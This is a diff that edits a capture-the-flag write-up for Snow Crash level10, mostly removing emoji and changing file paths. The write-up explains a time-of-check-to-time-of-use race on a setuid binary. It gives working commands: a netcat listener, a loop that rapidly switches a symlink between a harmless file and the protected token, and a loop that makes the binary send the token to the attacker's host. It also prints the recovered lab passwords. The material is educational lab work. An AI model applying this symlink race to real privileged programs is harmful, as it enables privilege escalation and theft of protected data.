@@ -1,6 +1,7 @@
 Snow Crash – Level10 Writeup (Baby Steps, Pro Explanation)
 
 
+
 Objective
 
 Exploit a race condition vulnerability in a setuid binary to bypass an access check and retrieve the protected token.
@@ -17,7 +18,8 @@ Privilege escalation logic
 
 Network exfiltration
 
-🪜 Step 1 – Initial Enumeration
+
+Step 1 – Initial Enumeration
 
 List files:
 
@@ -27,8 +29,8 @@ We see:
 
 -rwsr-sr-x+ 1 flag10 level10 10817 level10
 -rw-------  1 flag10 flag10     26 token
-🔎 Important Observations
-1️⃣ Setuid Binary
+Important Observations
+    Setuid Binary
 
 level10 has:
 
@@ -36,11 +38,11 @@ level10 has:
 
 The s means:
 
-👉 When executed, it runs as flag10.
+When executed, it runs as flag10.
 
 This is crucial.
 
-2️⃣ Token File
+Token File
 -rw------- 1 flag10 flag10 token
 
 Only flag10 can read it.
@@ -49,7 +51,7 @@ We cannot.
 
 So we must trick the binary into reading it for us.
 
-🪜 Step 2 – Test Program Behavior
+Step 2 – Test Program Behavior
 
 Run without arguments:
 
@@ -66,7 +68,7 @@ It sends a file to a remote host (port 6969).
 
 Test token:
 
-./level10 token localhost
+./level10 token host_ip
 
 Output:
 
@@ -92,11 +94,9 @@ Then later it opens the file.
 
 That creates a vulnerability.
 
-💣 What Is The Vulnerability?
+What Is The Vulnerability?
 
-This is a classic:
-
-👉 TOCTOU (Time Of Check To Time Of Use)
+This is a classic: TOCTOU (Time Of Check To Time Of Use)
 
 The program:
 
@@ -110,7 +110,7 @@ If we change the file between those two steps…
 
 We win.
 
-🪜 Step 4 – Prepare The Attack
+Step 4 – Prepare The Attack
 
 We need:
 
@@ -120,7 +120,8 @@ A symbolic link we can rapidly switch
 
 A network listener to receive the token
 
-🖥 Step 4.1 – Start Listener (On Host)
+
+Step 4.1 – Start Listener (On Host)
 
 On your host machine:
 
@@ -128,52 +129,48 @@ nc -l 6969
 
 Now it waits for incoming data.
 
-🪜 Step 4.2 – Prepare Files
+Step 4.2 – Prepare Files
 
 Create a harmless file:
 
-touch public
+touch /tmp/random
 
 Now create a symlink attack loop:
 
-while true; do
-    ln -sf token flip
-    ln -sf public flip
-done &
+level10@SnowCrash:~$ while true; do 
+ln -sf /tmp/random /tmp/my_token5; 
+ln -sf /home/user/level10/token /tmp/my_token5; 
+sleep 0.5; 
+done
 
-
-while true; do
-    ln -sf ~/user/level10/token /tmp/token
-    ln -sf  /tmp/random /tmp/token
-done &
 
 What this does:
 
-Rapidly switches flip between:
+Rapidly switches /tmp/my_token5 between:
 
 token (protected)
 
-public (accessible)
+/tmp/random (accessible)
 
 Thousands of times per second.
 
-🪜 Step 5 – Trigger the Race
+
+Step 5 – Trigger the Race
 
 Now execute in loop:
 
 while true; do
-    ./level10 flip YOUR_HOST_IP
+    ./level10 /tmp/my_token5 YOUR_HOST_IP
 done
 
-Replace YOUR_HOST_IP with your host’s IP.
 
-🧠 What Happens Internally
+What Happens Internally
 
 Sometimes:
 
-access("flip") checks while it points to public → OK
+access("/tmp/my_token5") checks while it points to /tmp/random → OK
 
-Before open("flip"), the symlink switches to token
+Before open("/tmp/my_token5"), the symlink switches to token
 
 The program opens token with flag10 privileges
 
@@ -181,7 +178,8 @@ Sends its contents to your netcat listener
 
 That tiny timing window is the race condition.
 
-🏁 Step 6 – Capture The Token
+
+Step 6 – Capture The Token
 
 On your listener:
 
@@ -189,7 +187,8 @@ woupa2yuojeeaaed06riuj63c
 
 That’s the password for flag10.
 
-🪜 Step 7 – Switch User
+
+Step 7 – Switch User
 su flag10
 
 Enter:
@@ -206,12 +205,13 @@ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 
 Level completed.
 
-🧠 What This Level Teaches
-🔹 Race Conditions
+
+What This Level Teaches
+- Race Conditions
 
 When two operations depend on timing, attackers can exploit the gap.
 
-🔹 TOCTOU
+- TOCTOU
 
 Time Of Check To Time Of Use:
 
@@ -223,11 +223,11 @@ Without rechecking
 
 That’s insecure design.
 
-🔹 Symbolic Link Abuse
+- Symbolic Link Abuse
 
 Symlinks are powerful tools in local privilege escalation.
 
-🔹 Real-World Relevance
+- Real-World Relevance
 
 This vulnerability appears in:
 
